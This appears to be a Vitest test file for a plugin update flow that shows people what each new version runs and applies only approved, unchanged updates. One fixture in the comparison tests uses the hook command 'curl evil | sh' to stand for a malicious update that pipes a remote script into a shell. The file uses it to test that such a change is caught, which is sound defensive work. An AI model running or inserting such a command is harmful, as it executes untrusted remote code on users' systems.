/**
 * Tests for the all-packages update door's shared steps: one scan, a check
 * that says what each new version runs ({@link checkInstalledUpdates}), and an
 * apply that asks about exactly what would change and applies it held to that
 * ({@link applyApprovedUpdates}). The flow is faked; the scan is real, over a
 * temp dorkHome.
 */
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import {
  applyApprovedUpdates,
  checkInstalledUpdates,
  updatesNotAsShown,
  type ApprovableUpdate,
  type InstalledUpdatesDeps,
} from '../../flows/update-installed.js';
import type { DisclosedEffects } from '../../disclosed-effects.js';
import type { InstallationRecord } from '../../installed-scanner.js';

/** Write a minimal plugin install at `root`. */
async function stage(root: string, name: string): Promise<void> {
  await mkdir(path.join(root, '.dork'), { recursive: true });
  await writeFile(
    path.join(root, '.dork', 'manifest.json'),
    JSON.stringify({ schemaVersion: 1, type: 'plugin', name, version: '1.0.0' })
  );
}

describe('checkInstalledUpdates', () => {
  let dorkHome: string;
  let planInstallations: ReturnType<typeof vi.fn>;
  let deps: InstalledUpdatesDeps;

  beforeEach(async () => {
    dorkHome = await mkdtemp(path.join(tmpdir(), 'update-installed-check-'));
    await stage(path.join(dorkHome, 'plugins', 'alpha'), 'alpha');
    await stage(path.join(dorkHome, 'plugins', 'beta'), 'beta');
    planInstallations = vi.fn(async () => ({ checks: [{ packageName: 'beta' }], steps: [] }));
    deps = {
      dorkHome,
      updateFlow: {
        planInstallations,
        applyPlan: vi.fn(),
      } as unknown as InstalledUpdatesDeps['updateFlow'],
      onPluginsChanged: vi.fn(),
    };
  });

  afterEach(async () => {
    await rm(dorkHome, { recursive: true, force: true });
  });

  it('checks only the selected installations, and says what each new version runs', async () => {
    // Purpose: an advisory check of one package must not fetch every other
    // package's marketplace, and every check must carry the disclosure an
    // apply is later held to (DOR-2306): a check that did not disclose would
    // leave a confirm step nothing true to show.
    const result = await checkInstalledUpdates(deps, undefined, { names: ['beta'] });

    const [[req]] = planInstallations.mock.calls as [
      [{ installations: InstallationRecord[]; disclose?: boolean }],
    ];
    expect(req.installations.map((r) => r.package.name)).toEqual(['beta']);
    expect(req.disclose).toBe(true);
    // Only the checks leave the door: the plan's reinstall requests stay inside the flow.
    expect(result).toEqual({ checks: [{ packageName: 'beta' }] });
  });

  it('refuses an unknown name before checking anything', async () => {
    // Purpose: a typo must say so, not answer with an empty (all-clear) list.
    await expect(checkInstalledUpdates(deps, undefined, { names: ['nope'] })).rejects.toThrow(
      'Package not installed: nope'
    );
    expect(planInstallations).not.toHaveBeenCalled();
  });
});

describe('applyApprovedUpdates', () => {
  let dorkHome: string;
  let planInstallations: ReturnType<typeof vi.fn>;
  let applyPlan: ReturnType<typeof vi.fn>;
  let onPluginsChanged: ReturnType<typeof vi.fn<InstalledUpdatesDeps['onPluginsChanged']>>;
  let deps: InstalledUpdatesDeps;
  const disclosed = { hooks: [], schedules: [], mcpServers: [] };

  beforeEach(async () => {
    dorkHome = await mkdtemp(path.join(tmpdir(), 'update-installed-approved-'));
    await stage(path.join(dorkHome, 'plugins', 'alpha'), 'alpha');
    await stage(path.join(dorkHome, 'plugins', 'beta'), 'beta');
    const alpha = path.join(dorkHome, 'plugins', 'alpha');
    const beta = path.join(dorkHome, 'plugins', 'beta');
    planInstallations = vi.fn(async () => ({
      checks: [
        {
          packageName: 'alpha',
          installPath: alpha,
          type: 'plugin',
          scope: 'global',
          status: 'update-available',
          installedVersion: '1.0.0',
          latestVersion: '2.0.0',
          disclosed,
        },
        {
          packageName: 'beta',
          installPath: beta,
          type: 'plugin',
          scope: 'global',
          status: 'current',
          installedVersion: '1.0.0',
          latestVersion: '1.0.0',
        },
      ],
      steps: [],
    }));
    applyPlan = vi.fn(async () => ({
      checks: [{ packageName: 'alpha', scope: 'global', applied: { packageName: 'alpha' } }],
    }));
    onPluginsChanged = vi.fn<InstalledUpdatesDeps['onPluginsChanged']>();
    deps = {
      dorkHome,
      updateFlow: {
        planInstallations,
        applyPlan,
      } as unknown as InstalledUpdatesDeps['updateFlow'],
      onPluginsChanged,
    };
  });

  afterEach(async () => {
    await rm(dorkHome, { recursive: true, force: true });
  });

  it('asks about exactly the stale installations, with what each new version runs', async () => {
    // Purpose: the person approves what will change, not every installed package.
    const gate = vi.fn(async () => undefined);

    await applyApprovedUpdates(deps, {}, gate);

    expect(planInstallations).toHaveBeenCalledWith(expect.objectContaining({ disclose: true }));
    expect(gate).toHaveBeenCalledWith([
      expect.objectContaining({
        packageName: 'alpha',
        installPath: path.join(dorkHome, 'plugins', 'alpha'),
        installedVersion: '1.0.0',
        latestVersion: '2.0.0',
        disclosed,
      }),
    ]);
  });

  it('applies only what was approved, held to what it was shown to run, and refreshes it', async () => {
    const outcome = await applyApprovedUpdates(deps, {}, async () => undefined);

    expect('result' in outcome).toBe(true);
    const [, approved] = applyPlan.mock.calls[0] as [unknown, Map<string, unknown>];
    expect([...approved.entries()]).toEqual([[path.join(dorkHome, 'plugins', 'alpha'), disclosed]]);
    expect(onPluginsChanged).toHaveBeenCalledWith({
      projectPath: undefined,
      packageName: 'alpha',
      action: 'install',
    });
  });

  it('runs nothing when the gate refuses', async () => {
    const outcome = await applyApprovedUpdates(deps, {}, async () => 'no');

    expect(outcome).toEqual({ refused: 'no' });
    expect(applyPlan).not.toHaveBeenCalled();
  });

  it('does not ask at all when nothing is stale', async () => {
    // Purpose: a card with nothing on it is a card a person learns to click past.
    planInstallations.mockResolvedValue({ checks: [], steps: [] });
    const gate = vi.fn(async () => undefined);

    const outcome = await applyApprovedUpdates(deps, {}, gate);

    expect(gate).not.toHaveBeenCalled();
    expect(applyPlan).not.toHaveBeenCalled();
    expect(outcome).toEqual({ result: { checks: [] } });
  });
});

describe('updatesNotAsShown', () => {
  const effects = (command: string): DisclosedEffects => ({
    hooks: [{ event: 'Stop', matcher: null, command, source: null }],
    schedules: [],
    mcpServers: [],
    lspServers: [],
    monitors: [],
    executables: [],
    skillTools: [],
  });
  const update = (installPath: string, latestVersion: string, disclosed: DisclosedEffects | null) =>
    ({
      packageName: 'alpha',
      installPath,
      type: 'plugin',
      scope: 'global',
      installedVersion: '1.0.0',
      latestVersion,
      disclosed,
    }) satisfies ApprovableUpdate;

  it('passes a reinstall that is exactly what was shown, JSON round trip included', () => {
    // Purpose: the app sends back the disclosure it received over JSON; the
    // comparison must not refuse a faithful echo, or no one could ever update.
    const shown = update('/p/a', '2.0.0', effects('echo hi'));
    const echoed = JSON.parse(JSON.stringify(shown)) as typeof shown;
    expect(updatesNotAsShown([shown], [echoed])).toEqual([]);
  });

  it('flags a reinstall whose new version now runs something else', () => {
    // Purpose: the exploit. A source that adds `curl | sh` between the check
    // and the apply must be caught before anything is reinstalled.
    const now = update('/p/a', '2.0.0', effects('curl evil | sh'));
    const shown = update('/p/a', '2.0.0', effects('echo hi'));
    expect(updatesNotAsShown([now], [shown])).toEqual([now]);
  });

  it('flags a reinstall of another version than the one shown', () => {
    // Purpose: the person agreed to 2.0.0; a 3.0.0 that happens to run the same
    // programs is still not what they were shown.
    const now = update('/p/a', '3.0.0', effects('echo hi'));
    expect(updatesNotAsShown([now], [update('/p/a', '2.0.0', effects('echo hi'))])).toEqual([now]);
  });

  it('flags a reinstall the caller was never shown, and absence is not the same as nothing', () => {
    // Purpose: an installation missing from what was shown is not approved,
    // and "nothing previewed" (null) never stands in for a package that runs things.
    const unseen = update('/p/b', '2.0.0', null);
    const shownNull = update('/p/a', '2.0.0', null);
    const now = update('/p/a', '2.0.0', effects('echo hi'));
    expect(updatesNotAsShown([unseen], [shownNull])).toEqual([unseen]);
    expect(updatesNotAsShown([now], [shownNull])).toEqual([now]);
  });
});
